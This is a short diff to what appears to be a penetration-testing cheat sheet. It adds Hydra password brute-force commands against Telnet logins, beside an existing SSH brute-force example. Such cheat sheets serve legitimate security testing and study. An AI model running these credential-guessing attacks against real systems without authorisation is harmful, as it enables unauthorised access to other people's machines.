@@ -29,6 +29,8 @@ hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100
 #### Telnet
 ```
 hydra -l <username> -P <password list> <target> telnet
+hydra -l admin -P wordlist.txt telnet://<IP>
+hydra -L users.txt -P passwords.txt telnet://<IP>
 ```
 
 #### RDP
